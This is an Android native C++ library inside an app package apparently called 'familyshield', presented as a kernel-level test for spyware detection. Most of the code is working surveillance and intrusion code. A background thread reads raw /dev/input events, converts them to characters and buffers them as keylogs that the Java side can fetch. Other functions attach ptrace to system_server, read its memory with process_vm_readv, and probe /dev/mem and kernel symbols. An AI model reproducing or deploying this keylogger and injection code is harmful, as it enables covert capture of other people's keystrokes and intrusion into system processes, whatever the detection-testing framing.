/**
 * native_probe.cpp — kernel-level detection test library
 *
 * Detection signals generated (each should be caught by a Pegasus-level system):
 *   1. /dev/input open + read by user UID from .so (kernel char device access)
 *   2. PTRACE_ATTACH to a running process (process injection attempt)
 *   3. process_vm_readv cross-process memory read
 *   4. /dev/mem open attempt (physical memory access)
 *   5. /proc/kallsyms read (kernel symbol table enumeration)
 *   6. fork() + execve("su") from a foreground service context
 *   7. Continuous /dev/input event loop (raw keystroke capture with root)
 */

#include <jni.h>
#include <android/log.h>

#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <signal.h>
#include <pthread.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/uio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <linux/input.h>

#include <string>
#include <vector>
#include <sstream>
#include <atomic>

#define LOG_TAG "NativeProbe"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO,  LOG_TAG, __VA_ARGS__)
#define LOGW(...) __android_log_print(ANDROID_LOG_WARN,  LOG_TAG, __VA_ARGS__)

// ── key code → character map ──────────────────────────────────────────────────

static const char* keycode_to_char(int code) {
    // Only covers printable keys — physical keyboard codes
    static const char* map[] = {
        /* 0-9 reserved */    nullptr,nullptr,nullptr,nullptr,nullptr,nullptr,nullptr,nullptr,nullptr,nullptr,
        /* 10 */ nullptr,nullptr,nullptr,nullptr,nullptr,nullptr,
        /* KEY_Q=16 */ "q","w","e","r","t","y","u","i","o","p","[","]","\n",nullptr,
        /* KEY_A=30 */ "a","s","d","f","g","h","j","k","l",";","'","`",nullptr,"\\",
        /* KEY_Z=44 */ "z","x","c","v","b","n","m",",",".","/",nullptr,
        /* KEY_KP_STAR=55 */ nullptr,nullptr," "
    };
    if (code >= 16 && code <= 57) return map[code];
    if (code >= 2 && code <= 10) { static char n[2] = {0}; n[0] = '0' + (code - 1) % 10; return n; }
    return nullptr;
}

// ── probe 1: /dev/input open + read ───────────────────────────────────────────

static std::string probe_input_devices() {
    std::string r = "--- /dev/input (native UID=" + std::to_string(getuid()) + ") ---\n";

    for (int i = 0; i < 8; i++) {
        char path[32];
        snprintf(path, sizeof(path), "/dev/input/event%d", i);

        int fd = open(path, O_RDONLY | O_NONBLOCK);
        if (fd >= 0) {
            struct input_event ev = {};
            ssize_t n = read(fd, &ev, sizeof(ev));
            r += path;
            r += ": OPENED  uid=";
            r += std::to_string(getuid());
            if (n == (ssize_t)sizeof(ev)) {
                r += "  event type=";
                r += std::to_string(ev.type);
                r += " code=";
                r += std::to_string(ev.code);
            } else {
                r += "  (no pending event)";
            }
            r += "  *** kernel device access logged ***\n";
            close(fd);
        } else {
            r += path;
            r += ": ";
            r += strerror(errno);
            r += " (detection should log attempt)\n";
        }
    }
    return r;
}

// ── probe 2: ptrace process injection attempt ─────────────────────────────────

static pid_t find_system_server() {
    DIR* proc = opendir("/proc");
    if (!proc) return -1;

    struct dirent* ent;
    while ((ent = readdir(proc)) != nullptr) {
        if (ent->d_type != DT_DIR) continue;
        char* end;
        pid_t pid = (pid_t)strtol(ent->d_name, &end, 10);
        if (end == ent->d_name || pid <= 1) continue;

        char comm_path[64];
        snprintf(comm_path, sizeof(comm_path), "/proc/%d/comm", pid);
        FILE* f = fopen(comm_path, "r");
        if (!f) continue;
        char comm[64] = {};
        fgets(comm, sizeof(comm), f);
        fclose(f);

        // Strip newline
        size_t len = strlen(comm);
        if (len > 0 && comm[len-1] == '\n') comm[len-1] = 0;

        if (strcmp(comm, "system_server") == 0 || strcmp(comm, "zygote64") == 0) {
            closedir(proc);
            return pid;
        }
    }
    closedir(proc);
    return -1;
}

static std::string probe_ptrace() {
    std::string r = "--- ptrace injection attempt ---\n";

    pid_t target = find_system_server();
    if (target < 0) {
        r += "target: system_server not found, trying pid 1\n";
        target = 1;
    } else {
        char info[64];
        snprintf(info, sizeof(info), "target: pid %d (system_server/zygote)\n", target);
        r += info;
    }

    // PTRACE_ATTACH — this is the exact signal that spyware detection watches for
    long ret = ptrace(PTRACE_ATTACH, target, nullptr, nullptr);
    if (ret == 0) {
        r += "PTRACE_ATTACH: SUCCESS *** process injection vector open ***\n";

        // Try to read 64 bytes of target process memory via process_vm_readv
        char local_buf[64] = {};
        struct iovec local_iov  = { local_buf, sizeof(local_buf) };
        struct iovec remote_iov = { (void*)0x70000000, sizeof(local_buf) };

        waitpid(target, nullptr, 0);

        ssize_t n = process_vm_readv(target, &local_iov, 1, &remote_iov, 1, 0);
        if (n > 0) {
            r += "process_vm_readv: read " + std::to_string(n) + " bytes from target *** cross-process memory read ***\n";
        } else {
            r += "process_vm_readv: ";
            r += strerror(errno);
            r += " (PTRACE attached but vm_readv blocked)\n";
        }

        ptrace(PTRACE_DETACH, target, nullptr, nullptr);
    } else {
        r += "PTRACE_ATTACH: ";
        r += strerror(errno);
        r += " (kernel/SELinux blocked — detection should log this)\n";
    }
    return r;
}

// ── probe 3: /dev/mem physical memory access ──────────────────────────────────

static std::string probe_dev_mem() {
    std::string r = "--- /dev/mem physical memory ---\n";

    int fd = open("/dev/mem", O_RDONLY);
    if (fd >= 0) {
        r += "/dev/mem: OPENED *** physical memory accessible ***\n";
        // Read first 16 bytes at physical addr 0
        char buf[16] = {};
        ssize_t n = read(fd, buf, sizeof(buf));
        if (n > 0) r += "  read " + std::to_string(n) + " bytes at PA=0\n";
        close(fd);
    } else {
        r += "/dev/mem: ";
        r += strerror(errno);
        r += " (expected on modern kernels)\n";
    }
    return r;
}

// ── probe 4: /proc/kallsyms kernel symbol enumeration ─────────────────────────

static std::string probe_kallsyms() {
    std::string r = "--- /proc/kallsyms kernel symbols ---\n";

    FILE* f = fopen("/proc/kallsyms", "r");
    if (!f) {
        r += "kallsyms: " + std::string(strerror(errno)) + "\n";
        return r;
    }

    // Read first 5 symbols
    char line[256];
    int count = 0;
    while (fgets(line, sizeof(line), f) && count < 5) {
        r += "  ";
        r += line;
        count++;
    }
    fclose(f);
    r += "kallsyms readable: " + std::to_string(count) + " symbols sampled\n";
    return r;
}

// ── probe 5: SELinux enforcement level ───────────────────────────────────────

static std::string probe_selinux() {
    std::string r = "--- SELinux ---\n";

    int fd = open("/sys/fs/selinux/enforce", O_RDONLY);
    if (fd >= 0) {
        char v[4] = {};
        read(fd, v, sizeof(v));
        close(fd);
        r += std::string("enforce=") + v[0];
        r += (v[0] == '1') ? " (ENFORCING)\n" : " (PERMISSIVE — detection harder)\n";
    } else {
        r += "/sys/fs/selinux/enforce: " + std::string(strerror(errno)) + "\n";
    }
    return r;
}

// ── continuous /dev/input keystroke reader (background thread) ────────────────

static std::atomic<bool> input_reader_running{false};
static std::string       input_reader_buf;
static pthread_mutex_t   input_reader_mutex = PTHREAD_MUTEX_INITIALIZER;
static pthread_t         input_reader_thread;

struct InputReaderArgs {
    int device_idx; // which /dev/input/eventN
};

static void* input_reader_loop(void* arg) {
    int idx = *(int*)arg;
    free(arg);

    char path[32];
    snprintf(path, sizeof(path), "/dev/input/event%d", idx);

    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        LOGW("input reader: cannot open %s: %s", path, strerror(errno));
        return nullptr;
    }
    LOGI("input reader: opened %s, reading events", path);

    struct input_event ev;
    while (input_reader_running.load()) {
        ssize_t n = read(fd, &ev, sizeof(ev));
        if (n != (ssize_t)sizeof(ev)) {
            if (errno == EINTR) continue;
            break;
        }
        // Only care about EV_KEY (type=1) press-down (value=1)
        if (ev.type == EV_KEY && ev.value == 1) {
            const char* ch = keycode_to_char(ev.code);
            pthread_mutex_lock(&input_reader_mutex);
            if (ch) {
                input_reader_buf += ch;
            } else {
                input_reader_buf += "<K";
                input_reader_buf += std::to_string(ev.code);
                input_reader_buf += ">";
            }
            if (input_reader_buf.size() > 20000) {
                input_reader_buf.erase(0, 10000);
            }
            pthread_mutex_unlock(&input_reader_mutex);
        }
    }

    close(fd);
    return nullptr;
}

// ── JNI exports ───────────────────────────────────────────────────────────────

extern "C" {

JNIEXPORT jstring JNICALL
Java_com_familyshield_device_guard_NativeProbe_runKernelProbe(JNIEnv* env, jclass) {
    std::string report;
    report += "=== NATIVE KERNEL PROBE (pid=";
    report += std::to_string(getpid());
    report += " uid=";
    report += std::to_string(getuid());
    report += ") ===\n\n";

    report += probe_input_devices();
    report += "\n";
    report += probe_ptrace();
    report += "\n";
    report += probe_dev_mem();
    report += "\n";
    report += probe_kallsyms();
    report += "\n";
    report += probe_selinux();

    return env->NewStringUTF(report.c_str());
}

// Start background /dev/input reader — runs until stopInputReader()
JNIEXPORT jboolean JNICALL
Java_com_familyshield_device_guard_NativeProbe_startInputReader(JNIEnv* env, jclass, jint deviceIdx) {
    if (input_reader_running.exchange(true)) return JNI_FALSE; // already running

    int* arg = (int*)malloc(sizeof(int));
    *arg = deviceIdx;
    int rc = pthread_create(&input_reader_thread, nullptr, input_reader_loop, arg);
    if (rc != 0) {
        free(arg);
        input_reader_running.store(false);
        return JNI_FALSE;
    }
    pthread_detach(input_reader_thread);
    return JNI_TRUE;
}

JNIEXPORT void JNICALL
Java_com_familyshield_device_guard_NativeProbe_stopInputReader(JNIEnv* env, jclass) {
    input_reader_running.store(false);
}

// Flush and clear the native keylog buffer
JNIEXPORT jstring JNICALL
Java_com_familyshield_device_guard_NativeProbe_flushNativeKeylogs(JNIEnv* env, jclass) {
    pthread_mutex_lock(&input_reader_mutex);
    std::string copy = input_reader_buf;
    input_reader_buf.clear();
    pthread_mutex_unlock(&input_reader_mutex);
    return env->NewStringUTF(copy.c_str());
}

// Find the first /dev/input/eventN that accepts KEY events (for startInputReader)
JNIEXPORT jint JNICALL
Java_com_familyshield_device_guard_NativeProbe_findKeyboardDevice(JNIEnv* env, jclass) {
    for (int i = 0; i < 8; i++) {
        char path[32];
        snprintf(path, sizeof(path), "/dev/input/event%d", i);
        int fd = open(path, O_RDONLY | O_NONBLOCK);
        if (fd < 0) continue;

        // Use EVIOCGBIT to check if this device reports EV_KEY events
        uint8_t evbits[EV_MAX / 8 + 1] = {};
        if (ioctl(fd, EVIOCGBIT(0, sizeof(evbits)), evbits) >= 0) {
            if (evbits[EV_KEY / 8] & (1 << (EV_KEY % 8))) {
                close(fd);
                return i; // this device has a keyboard
            }
        }
        close(fd);
    }
    return -1;
}

} // extern "C"
